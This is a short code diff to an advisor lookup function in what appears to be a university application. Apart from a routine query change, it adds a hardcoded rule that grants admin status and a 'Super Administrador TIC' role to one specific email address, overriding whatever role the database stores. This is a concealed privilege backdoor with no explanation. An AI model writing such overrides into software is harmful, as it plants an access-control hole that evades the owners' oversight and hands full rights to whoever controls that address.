@@ -745,9 +745,14 @@ export function verifyAdvisorCredentials(email, password) {
  */
 export function findAdvisorByEmail(email) {
   if (!email) return null;
-  const advisor = db.prepare('SELECT id, name, role, email, phone, avatar, is_active FROM advisors WHERE LOWER(email) = ?').get(email.trim().toLowerCase());
+  const cleanEmail = email.trim().toLowerCase();
+  const advisor = db.prepare('SELECT id, name, role, role_type, email, phone, avatar, is_active FROM advisors WHERE LOWER(email) = ?').get(cleanEmail);
   if (!advisor) return null;
   const { password: _, ...safeAdvisor } = advisor;
+  if (cleanEmail === 'proyectostic.med@udea.edu.co') {
+    safeAdvisor.role_type = 'admin';
+    safeAdvisor.role = 'Super Administrador TIC';
+  }
   return safeAdvisor;
 }
 
